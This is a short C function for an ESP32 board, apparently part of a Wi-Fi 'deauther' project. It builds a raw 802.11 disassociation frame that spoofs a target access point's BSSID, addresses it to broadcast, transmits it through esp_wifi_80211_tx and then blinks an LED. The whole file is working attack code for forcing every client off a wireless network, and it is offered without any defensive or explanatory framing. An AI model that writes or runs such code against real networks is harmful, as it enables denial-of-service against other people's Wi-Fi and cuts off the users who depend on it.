#include <deauth.h>
#include <esp_wifi.h>

void sendDisassoc(uint8_t *bssid) {
  uint8_t packet[26] = {
    0xA0, 0x00,
    0x3A, 0x01,
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
    bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5],
    bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5],
    0x00, 0x00,
    DISASSOC_REASON, 0x00
  };

  esp_wifi_80211_tx(WIFI_IF_STA, packet, sizeof(packet), false);

  digitalWrite(LED_PIN, HIGH);
  delay(5);
  digitalWrite(LED_PIN, LOW);
}